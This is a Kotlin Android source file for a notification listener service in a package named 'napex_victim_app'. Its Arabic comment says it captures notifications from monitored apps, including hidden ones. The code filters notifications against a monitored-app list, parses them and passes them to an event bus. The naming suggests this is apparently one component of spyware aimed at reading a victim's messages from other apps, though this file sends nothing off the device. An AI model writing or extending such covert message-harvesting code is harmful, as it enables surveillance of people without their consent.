package com.napex.napex_victim_app.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

import com.napex.napex_victim_app.config.AppConfigs
import com.napex.napex_victim_app.parser.NotificationParser

/**
 * خدمة الاستماع للإشعارات — تلتقط إشعارات التطبيقات المُراقَبة
 * حتى تلك التي لا تظهر في شريط الحالة.
 */
class NapexNotificationListenerService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val packageName = sbn.packageName ?: return

        // تجاهل إشعارات التطبيق نفسه
        if (packageName == applicationContext.packageName) return

        if (!AppConfigs.isMonitored(packageName)) return

        val parsed = NotificationParser.parseStatusBarNotification(sbn) ?: return
        MessageEventBus.emit(parsed)
    }
}
